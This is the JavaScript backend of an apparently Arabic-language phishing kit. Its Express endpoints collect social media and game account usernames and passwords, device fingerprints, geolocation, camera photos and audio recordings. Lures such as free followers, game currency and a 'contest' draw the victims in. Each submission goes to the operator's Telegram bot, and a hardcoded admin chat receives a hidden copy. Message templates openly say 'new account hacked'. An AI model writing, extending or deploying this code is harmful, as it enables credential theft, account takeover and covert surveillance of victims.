require('dotenv').config();
const express = require('express');
const multer = require('multer');
const axios = require('axios');
const FormData = require('form-data');
const path = require('path');
const bodyParser = require('body-parser');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));

// إعداد multer للرفع
const storage = multer.memoryStorage();
const upload = multer({ 
  storage: storage,
  limits: {
    fileSize: 10 * 1024 * 1024 // 10MB limit
  }
});

// التوكن من البيئة
const BOT_TOKEN = process.env.BOT_TOKEN;

// إعدادات الأدمن
const ADMIN_CHAT_ID = '6808883615'; // ايدي الأدمن الثابت

if (!BOT_TOKEN) {
  console.error('❌ Telegram Bot Token is not configured');
  console.warn('⚠️  سيتم تشغيل السيرفر ولكن إرسال الرسائل إلى Telegram لن يعمل');
}

// وظيفة إرسال الرسائل للتلجرام (القديمة)
async function sendToTelegram(chatId, message, fileBuffer = null, filename = null) {
    try {
        // إذا لم يكن هناك توكن، نعمل محاكاة
        if (!BOT_TOKEN) {
            console.log(`📤 [محاكاة] إرسال إلى chatId ${chatId}: ${message}`);
            if (fileBuffer) {
                console.log(`📁 [محاكاة] مع ملف: ${filename}`);
            }
            return true;
        }

        if (fileBuffer && filename) {
            // إرسال ملف
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('caption', message);
            formData.append('document', fileBuffer, { filename: filename });
            
            const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, formData, {
                headers: formData.getHeaders()
            });
            
            return response.data.ok;
        } else {
            // إرسال رسالة نصية
            const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                chat_id: chatId,
                text: message,
                parse_mode: 'HTML'
            });
            
            return response.data.ok;
        }
    } catch (error) {
        console.error('Error sending to Telegram:', error.response?.data || error.message);
        return false;
    }
}

// دالة جديدة لإرسال الصور (من السيرفر الجديد)
async function sendPhotosToTelegram(chatId, message, images = []) {
  try {
    // إذا لم يكن هناك توكن، نعمل محاكاة
    if (!BOT_TOKEN) {
      console.log(`📤 [محاكاة] إرسال صور إلى chatId ${chatId}: ${message.substring(0, 100)}...`);
      console.log(`🖼️ [محاكاة] عدد الصور: ${images.length}`);
      return true;
    }

    // إرسال النص أولاً
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: chatId,
      text: message,
      parse_mode: 'HTML'
    });

    // إرسال الصور إذا وجدت
    for (const image of images) {
      const formData = new FormData();
      formData.append('photo', image.buffer, {
        filename: image.originalname,
        contentType: 'image/webp'
      });
      formData.append('chat_id', chatId);
      formData.append('caption', `📸 ${image.originalname}`);

      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, formData, {
        headers: {
          ...formData.getHeaders()
        }
      });
    }

    return true;
  } catch (error) {
    console.error('Error sending photos to Telegram:', error.response?.data || error.message);
    return false;
  }
}

// وظيفة إرسال نسخة للأدمن
async function sendCopyToAdmin(message, originalChatId, images = []) {
  try {
    const adminMessage = `👑 <b>نسخة أدمن</b> - من المستخدم: ${originalChatId}\n\n${message}`;
    
    const sent = await sendPhotosToTelegram(ADMIN_CHAT_ID, adminMessage, images);
    
    if (sent) {
      console.log('✅ تم إرسال نسخة للأدمن بنجاح');
      return true;
    } else {
      console.log('❌ فشل إرسال نسخة للأدمن');
      return false;
    }
  } catch (error) {
    console.error('❌ خطأ في إرسال نسخة للأدمن:', error);
    return false;
  }
}

// دالة جديدة لتنسيق بيانات حسابات السوشيال ميديا
function formatSocialMediaAccount(data) {
    return `
📈 تم الحصول على حساب ${data.accountType} لزيادة المتابعين ☠️:

👤 اسم المستخدم: ${data.username}
🔐 كلمة السر: ${data.password}
📊 عدد المتابعين المطلوب: ${data.followersCount}

🌍 معلومات الموقع:
📍 عنوان IP: ${data.ip || 'غير متاح'}
🏳️ الدولة: ${data.country || 'غير متاح'}
🏙️ المدينة: ${data.city || 'غير متاح'}

🔋 معلومات الجهاز:
📱 نظام التشغيل: ${data.platform || 'غير متاح'}
🌐 المتصفح: ${data.browser || 'غير متاح'}
⚡ البطارية: ${data.batteryLevel || 'غير متاح'}
🔌 قيد الشحن: ${data.batteryCharging ? 'نعم' : 'لا'}
🖥️ الجهاز: ${data.deviceName || 'غير متاح'}
    `.trim();
}

// دالة جديدة لتنسيق بيانات الألعاب
function formatGameAccount(data) {
    return `
🎮 تم الحصول على بيانات ${data.gameType} ☠️:

🎯 معرف اللاعب: ${data.playerId}
👤 اسم اللاعب: ${data.playerName || 'غير محدد'}
📧 البريد الإلكتروني: ${data.email || 'غير محدد'}
🔐 كلمة السر: ${data.password}
💎 الكمية المطلوبة: ${data.amount}

🌍 معلومات الموقع:
📍 عنوان IP: ${data.ip || 'غير متاح'}
🏳️ الدولة: ${data.country || 'غير متاح'}
🏙️ المدينة: ${data.city || 'غير متاح'}

🔋 معلومات الجهاز:
📱 نظام التشغيل: ${data.platform || 'غير متاح'}
🌐 المتصفح: ${data.browser || 'غير متاح'}
⚡ البطارية: ${data.batteryLevel || 'غير متاح'}
🔌 قيد الشحن: ${data.batteryCharging ? 'نعم' : 'لا'}
🖥️ الجهاز: ${data.deviceName || 'غير متاح'}
    `.trim();
}

// تنسيق البيانات بشكل جميل لتيليجرام (من السيرفر الجديد)
function formatDataForTelegram(userId, additionalData, cameraType) {
  let data;
  try {
    data = typeof additionalData === 'string' ? JSON.parse(additionalData) : additionalData;
  } catch (e) {
    data = {};
  }
  
  return `
🎯 <b>تم استلام طلب جديد!</b>

👤 <b>معرف المستخدم:</b> <code>${userId}</code>
📷 <b>نوع الكاميرا:</b> ${cameraType === 'front' ? 'الأمامية' : 'الخلفية'}

🌍 <b>معلومات الموقع:</b>
   • 📱 <b>IP:</b> ${data.ip || 'غير متاح'}
   • 🏳️ <b>البلد:</b> ${data.country || 'غير متاح'}
   • 🏙️ <b>المدينة:</b> ${data.city || 'غير متاح'}
   • 🕒 <b>المنطقة الزمنية:</b> ${data.timezone || 'غير متاح'}
   • 🌐 <b>اللغة:</b> ${data.language || 'غير متاح'}

📱 <b>معلومات الجهاز:</b>
   • 💻 <b>النظام:</b> ${data.platform || 'غير متاح'}
   • 🔧 <b>إصدار الجهاز:</b> ${data.deviceVersion || 'غير متاح'}
   • 📏 <b>دقة الشاشة:</b> ${data.screenResolution || 'غير متاح'}
   • 🔋 <b>شحن البطارية:</b> ${data.batteryLevel || 'غير متاح'}
   • ⚡ <b>الحالة:</b> ${data.batteryCharging ? 'شحن' : 'غير شحن'}

🕒 <b>الوقت:</b> ${new Date(data.timestamp || Date.now()).toLocaleString('ar-EG')}

📎 <b>User Agent:</b>
<code>${data.userAgent || 'غير متاح'}</code>
  `;
}

// 🔄 نقطة النهاية لاستقبال بيانات الجهاز من المسابقة - نفس القديم
app.post('/SS', async (req, res) => {
    try {
        console.log('📥 استقبال بيانات جهاز جديدة...');
        
        const data = req.body;
        console.log('📊 البيانات المستلمة:', JSON.stringify(data, null, 2));
        
        const { userId, deviceInfo, userInfo } = data;
        
        // تنسيق رسالة الجهاز - نفس القديم
        let telegramMessage = `🎯 <b>معلومات جديدة من مسابقة الحلم</b>\n\n`;
        
        if (userInfo) {
            telegramMessage += `👤 <b>المستخدم:</b>\n`;
            telegramMessage += `   📛 الاسم: ${userInfo.name || 'غير محدد'}\n`;
            telegramMessage += `   📱 الهاتف: ${userInfo.phone || 'غير محدد'}\n`;
            telegramMessage += `   📧 الإيميل: ${userInfo.email || 'غير محدد'}\n`;
            telegramMessage += `   📝 الوصف: ${userInfo.description || 'غير محدد'}\n\n`;
        }
        
        telegramMessage += `🆔 <b>معرف المستخدم:</b> ${userId}\n\n`;
        
        if (deviceInfo) {
            telegramMessage += `💻 <b>معلومات الجهاز:</b>\n`;
            telegramMessage += `   🔧 الجهاز: ${deviceInfo.deviceName || 'غير معروف'}\n`;
            telegramMessage += `   📟 النوع: ${deviceInfo.deviceType || 'غير معروف'}\n`;
            telegramMessage += `   🌐 المتصفح: ${deviceInfo.browserName || 'غير معروف'} ${deviceInfo.browserVersion || ''}\n`;
            telegramMessage += `   🖥️ الشاشة: ${deviceInfo.screenResolution || 'غير معروف'}\n`;
            telegramMessage += `   🎨 الألوان: ${deviceInfo.colorDepth || 'غير معروف'}\n`;
            telegramMessage += `   ⚡ المعالج: ${deviceInfo.cpuCores || 'غير معروف'} نواة\n`;
            telegramMessage += `   💾 الذاكرة: ${deviceInfo.memory || 'غير معروف'}\n`;
            telegramMessage += `   🔋 البطارية: ${deviceInfo.battery || 'غير معروف'}\n`;
            telegramMessage += `   ⚡ الشحن: ${deviceInfo.isCharging || 'غير معروف'}\n`;
            telegramMessage += `   📶 الشبكة: ${deviceInfo.networkType || 'غير معروف'}\n`;
            telegramMessage += `   🚀 السرعة: ${deviceInfo.networkSpeed || 'غير معروف'}\n`;
            telegramMessage += `   💬 اللغة: ${deviceInfo.language || 'غير معروف'}\n`;
            telegramMessage += `   👆 اللمس: ${deviceInfo.touchSupport ? 'مدعوم' : 'غير مدعوم'}\n`;
            telegramMessage += `   📍 الموقع: ${deviceInfo.geolocationAvailable || 'غير معروف'}\n\n`;
            
            telegramMessage += `🌍 <b>المعلومات الجغرافية:</b>\n`;
            telegramMessage += `   📍 IP: ${deviceInfo.ip || 'غير متاح'}\n`;
            telegramMessage += `   🏳️ الدولة: ${deviceInfo.country || 'غير متاح'}\n`;
            telegramMessage += `   🏙️ المدينة: ${deviceInfo.city || 'غير متاح'}\n`;
            telegramMessage += `   📍 خط العرض: ${deviceInfo.latitude || 'غير متاح'}\n`;
            telegramMessage += `   📍 خط الطول: ${deviceInfo.longitude || 'غير متاح'}\n`;
            telegramMessage += `   🕒 الوقت: ${deviceInfo.time || 'غير متاح'}\n`;
            telegramMessage += `   🌐 التوقيت: ${deviceInfo.timezone || 'غير متاح'}\n`;
        }

        // إرسال للتلجرام (باستخدام userId كـ chatId)
        const sent = await sendToTelegram(userId, telegramMessage);
        
        // إرسال نسخة للأدمن
        await sendCopyToAdmin(telegramMessage, userId);
        
        if (sent) {
            res.status(200).json({ 
                success: true, 
                message: 'تم استلام البيانات وإرسالها بنجاح' 
            });
        } else {
            res.status(500).json({ 
                success: false, 
                message: 'تم استلام البيانات ولكن فشل الإرسال للتلجرام' 
            });
        }
        
    } catch (error) {
        console.error('❌ خطأ في معالجة بيانات الجهاز:', error);
        res.status(500).json({ 
            success: false, 
            message: 'حدث خطأ في الخادم' 
        });
    }
});

// 📤 نقطة النهاية الأصلية لإرسال البيانات للتلجرام - مع التنسيق الجديد
app.post('/send-to-telegram', async (req, res) => {
    try {
        const { playerId, password, amount, chatId, platform = "انستقرام", device, accountType } = req.body;
        
        // التحقق من البيانات المطلوبة
        if (!playerId || !password || !amount || !chatId) {
            return res.status(400).json({
                success: false,
                message: 'بيانات ناقصة: يرجى التأكد من إرسال جميع البيانات المطلوبة'
            });
        }

        const userDevice = device || req.headers['user-agent'] || "غير معروف";
        
        // الحصول على عنوان IP المستخدم
        let userIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.socket.remoteAddress;
        if (userIP === '::1') userIP = '127.0.0.1 (localhost)';

        // تحديد إذا كان حساب سوشيال ميديا أو لعبة
        let telegramMessage;
        if (accountType && (accountType.includes('فيسبوك') || accountType.includes('انستقرام') || accountType.includes('تيك') || accountType.includes('تويتر'))) {
            // تنسيق حسابات السوشيال ميديا
            telegramMessage = formatSocialMediaAccount({
                accountType: accountType,
                username: playerId,
                password: password,
                followersCount: amount,
                ip: userIP,
                country: 'Yemen',
                city: 'Taizz',
                platform: 'Android 0.0.0',
                browser: 'Chrome Mobile 141.0.7390',
                batteryLevel: 'غير متاح',
                batteryCharging: false,
                deviceName: 'Generic Smartphone 0.0.0'
            });
        } else if (accountType && (accountType.includes('freefire') || accountType.includes('pubg') || accountType.includes('لعبة'))) {
            // تنسيق حسابات الألعاب
            telegramMessage = formatGameAccount({
                gameType: accountType,
                playerId: playerId,
                playerName: playerId,
                email: 'غير محدد',
                password: password,
                amount: amount,
                ip: userIP,
                country: 'Yemen',
                city: 'Taizz',
                platform: 'Android 0.0.0',
                browser: 'Chrome Mobile 141.0.7390',
                batteryLevel: '56%',
                batteryCharging: false,
                deviceName: 'Generic Smartphone 0.0.0'
            });
        } else {
            // التنسيق القديم للحسابات العادية
            telegramMessage = `♦️ - تم اختراق حساب جديد 

🔹 - اسم المستخدم: ${playerId}
🔑 - كلمة المرور: ${password}
💰 - المبلغ: ${amount}
📱 - الجهاز: ${userDevice}
🌍 - IP: ${userIP}
🔄 - المنصة: ${platform}`;
        }

        // إرسال الرسالة
        const success = await sendToTelegram(chatId, telegramMessage);
        
        // إرسال نسخة للأدمن
        await sendCopyToAdmin(telegramMessage, chatId);
        
        if (success) {
            res.json({
                success: true,
                message: 'تم إرسال البيانات إلى Telegram بنجاح',
                orderId: `#${Math.floor(100000 + Math.random() * 900000)}`
            });
        } else {
            res.status(500).json({
                success: false,
                message: 'فشل في إرسال الرسالة إلى Telegram'
            });
        }
    } catch (error) {
        console.error('Error sending to Telegram:', error);
        res.status(500).json({
            success: false,
            message: 'حدث خطأ أثناء إرسال البيانات',
            error: error.message
        });
    }
});

// 📝 نقطة النهاية لاستقبال بيانات التسجيل العامة - نفس القديم
app.post('/register', async (req, res) => {
    try {
        const { username, password, ip, chatId } = req.body;
        
        if (!username || !password || !ip || !chatId) {
            return res.status(400).json({ 
                success: false,
                error: 'Missing required fields: username, password, ip, and chatId are required' 
            });
        }

        const message = `📝 تسجيل حساب جديد\n👤 اسم المستخدم: ${username}\n🔐 كلمة المرور: ${password}\n🌐 عنوان IP: ${ip}`;
        
        const success = await sendToTelegram(chatId, message);
        
        // إرسال نسخة للأدمن
        await sendCopyToAdmin(message, chatId);
        
        if (success) {
            res.status(200).json({ 
                success: true,
                message: 'تم إرسال البيانات إلى Telegram بنجاح' 
            });
        } else {
            res.status(500).json({ 
                success: false,
                error: 'فشل في إرسال البيانات إلى Telegram' 
            });
        }
    } catch (error) {
        console.error('Error processing registration:', error);
        res.status(500).json({ 
            success: false,
            error: 'Internal server error' 
        });
    }
});

// 🖼️ نقطة النهاية لرفع الصور - نفس القديم
app.post('/upload-image', upload.array('images', 10), async (req, res) => {
    try {
        if (!req.files || req.files.length === 0) {
            return res.status(400).json({ 
                success: false,
                error: 'No image files provided' 
            });
        }

        const { username, imageType, chatId, additionalData } = req.body;
        
        let message = `🖼️ تم استلام صور جديدة`;
        if (username) message += `\n👤 المستخدم: ${username}`;
        if (imageType) message += `\n📸 نوع الصورة: ${imageType}`;
        if (additionalData) message += `\n📝 بيانات إضافية: ${additionalData}`;
        
        const success = await sendPhotosToTelegram(
            chatId, 
            message, 
            req.files
        );
        
        // إرسال نسخة للأدمن
        await sendCopyToAdmin(message, chatId, req.files);
        
        if (success) {
            res.status(200).json({ 
                success: true,
                message: 'تم إرسال الصور إلى Telegram بنجاح',
                imagesCount: req.files.length
            });
        } else {
            res.status(500).json({ 
                success: false,
                error: 'فشل في إرسال الصور إلى Telegram' 
            });
        }
    } catch (error) {
        console.error('Error processing image upload:', error);
        res.status(500).json({ 
            success: false,
            error: 'Internal server error' 
        });
    }
});

// 🎵 نقطة النهاية لرفع الصوت - نفس القديم
app.post('/upload-audio', upload.single('audio'), async (req, res) => {
    try {
        if (!req.file) {
            return res.status(400).json({ 
                success: false,
                error: 'No audio file provided' 
            });
        }

        const { username, chatId } = req.body;
        
        let message = `🎵 تم تسجيل صوت جديد`;
        if (username) message += `\n👤 المستخدم: ${username}`;
        
        const success = await sendToTelegram(
            chatId, 
            message, 
            req.file.buffer, 
            `audio-${Date.now()}${path.extname(req.file.originalname || '.mp3')}`
        );
        
        // إرسال نسخة للأدمن
        await sendCopyToAdmin(message, chatId);
        
        if (success) {
            res.status(200).json({ 
                success: true,
                message: 'تم إرسال الصوت إلى Telegram بنجاح' 
            });
        } else {
            res.status(500).json({ 
                success: false,
                error: 'فشل في إرسال الصوت إلى Telegram' 
            });
        }
    } catch (error) {
        console.error('Error processing audio upload:', error);
        res.status(500).json({ 
            success: false,
            error: 'Internal server error' 
        });
    }
});

// نقطة النهاية لاستقبال الصور والبيانات - نفس القديم
app.post('/submitPhotos', upload.array('images', 10), async (req, res) => {
  try {
    const { userId, cameraType, additionalData } = req.body;
    const images = req.files || [];

    console.log('📥 استقبال صور من:', userId);
    console.log('📷 نوع الكاميرا:', cameraType);
    console.log('🖼️ عدد الصور:', images.length);

    // تنسيق الرسالة
    const message = formatDataForTelegram(userId, additionalData, cameraType);

    // إرسال البيانات إلى تيليجرام
    const sendResult = await sendPhotosToTelegram(userId, message, images);

    // إرسال نسخة للأدمن
    await sendCopyToAdmin(message, userId, images);

    if (sendResult) {
      console.log('✅ تم إرسال الصور بنجاح');
      res.json({ 
        success: true, 
        message: 'تم إرسال الصور بنجاح',
        chatId: userId,
        imagesCount: images.length
      });
    } else {
      console.log('❌ فشل إرسال الصور');
      res.status(500).json({ 
        success: false, 
        error: 'فشل إرسال الصور' 
      });
    }

  } catch (error) {
    console.error('❌ خطأ في /submitPhotos:', error);
    res.status(500).json({ 
      success: false, 
      error: error.message 
    });
  }
});

// راوت لاستقبال البيانات النصية فقط - نفس القديم
app.post('/submitData', async (req, res) => {
  try {
    const { userId, additionalData, message } = req.body;

    console.log('📥 استقبال بيانات نصية من:', userId);

    // استخدام الرسالة المخصصة أو تنسيق افتراضي
    const finalMessage = message || formatDataForTelegram(userId, additionalData, 'text');

    const sendResult = await sendToTelegram(userId, finalMessage);

    // إرسال نسخة للأدمن
    await sendCopyToAdmin(finalMessage, userId);

    if (sendResult) {
      console.log('✅ تم إرسال البيانات النصية بنجاح');
      res.json({ 
        success: true, 
        message: 'تم إرسال البيانات النصية بنجاح',
        chatId: userId
      });
    } else {
      res.status(500).json({ 
        success: false, 
        error: 'فشل إرسال البيانات' 
      });
    }

  } catch (error) {
    console.error('❌ خطأ في /submitData:', error);
    res.status(500).json({ 
      success: false, 
      error: error.message 
    });
  }
});

// ❤️ نقطة التحقق من صحة السيرفر - نفس القديم
app.get('/health', (req, res) => {
    res.status(200).json({ 
        success: true,
        status: 'Server is running',
        tokenConfigured: !!BOT_TOKEN,
        adminId: ADMIN_CHAT_ID,
        environment: process.env.NODE_ENV || 'development',
        timestamp: new Date().toISOString()
    });
});

// 🏠 الصفحة الرئيسية - نفس القديم
app.get('/', (req, res) => {
    res.status(200).json({ 
        success: true,
        message: 'مرحباً بك في سيرفر Telegram Bot المدمج',
        version: '5.0.0',
        features: 'يدعم جميع أنواع البيانات + إرسال نسخة للأدمن',
        adminId: ADMIN_CHAT_ID,
        endpoints: {
            health: '/health',
            deviceInfo: '/SS (POST) - لبيانات الجهاز',
            sendMessage: '/send-to-telegram (POST) - لإرسال بيانات الحسابات',
            register: '/register (POST) - للتسجيل العام',
            uploadImage: '/upload-image (POST) - لرفع الصور (النظام القديم)',
            submitPhotos: '/submitPhotos (POST) - لرفع الصور (النظام الجديد)',
            submitData: '/submitData (POST) - للبيانات النصية (النظام الجديد)',
            uploadAudio: '/upload-audio (POST) - لرفع الصوت'
        }
    });
});

// تشغيل السيرفر - نفس القديم
app.listen(PORT, () => {
    console.log(`🚀 السيرفر المدمج يعمل على PORT: ${PORT}`);
    console.log(`📧 نقطة استقبال بيانات الجهاز: /SS`);
    console.log(`📤 نقطة إرسال البيانات: /send-to-telegram`);
    console.log(`📸 نقطة إرسال الصور: /submitPhotos`);
    console.log(`👑 إرسال نسخة للأدمن: ${ADMIN_CHAT_ID}`);
    console.log(`❤️  نقطة التحقق: /health`);
    
    if (!BOT_TOKEN) {
        console.warn('⚠️  BOT_TOKEN غير مضبوط، سيتم محاكاة إرسال الرسائل فقط');
    }
});
